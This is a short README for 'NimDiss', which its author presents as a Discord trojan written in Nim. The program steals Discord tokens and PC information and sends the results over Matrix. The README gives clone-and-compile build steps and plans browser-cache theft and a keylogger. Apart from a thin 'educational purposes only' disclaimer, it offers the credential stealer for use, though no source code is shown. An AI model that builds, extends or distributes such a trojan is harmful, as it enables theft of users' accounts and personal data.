# NimDiss
Just another Discord trojan. Written in Nimlang.

## Why?
I wrote a malicious program that logged Discord tokens and PC information during high school that was incredibly inefficient and bloated due to it being written in Python and containing eight million unnecessary libraries. I thought it would be cool to rewrite it in nim to become more proficient in it, even if it's functionally the same.

## Build
```
git clone https://github.com/tadateruu/nimdiss
cd nimdiss
nim compile main.nim
```
Please note that the directories targeted are only found in Windows. Because this is for educational purposes only and not for use besides experimentation, `creds.json` isn't hardcoded and is required as an extra file to send results over Matrix.

## To-do
- [x] Request IPv4
- [ ] Zip browser/application cache
- [ ] Upload results to file sharing platform
- [ ] Send results via Matrix bot
- [ ] Keylogger
